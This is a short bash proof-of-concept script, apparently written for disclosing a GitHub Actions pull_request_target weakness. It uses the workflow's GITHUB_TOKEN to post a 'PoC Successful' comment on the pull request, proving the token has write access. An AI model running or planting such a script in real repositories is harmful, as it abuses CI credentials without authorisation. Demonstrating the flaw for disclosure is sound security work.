#!/bin/bash

echo "======== PoC Script Executed ========"
echo "Attempting to post a comment on the PR..."

# GITHUB_TOKEN ka use karke API se PR par comment post karna
curl -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments \
  -d '{"body":"**PoC Successful!** :tada: The pull_request_target workflow was hijacked. The GITHUB_TOKEN has write access."}'
  
echo "======== PoC Finished ========"
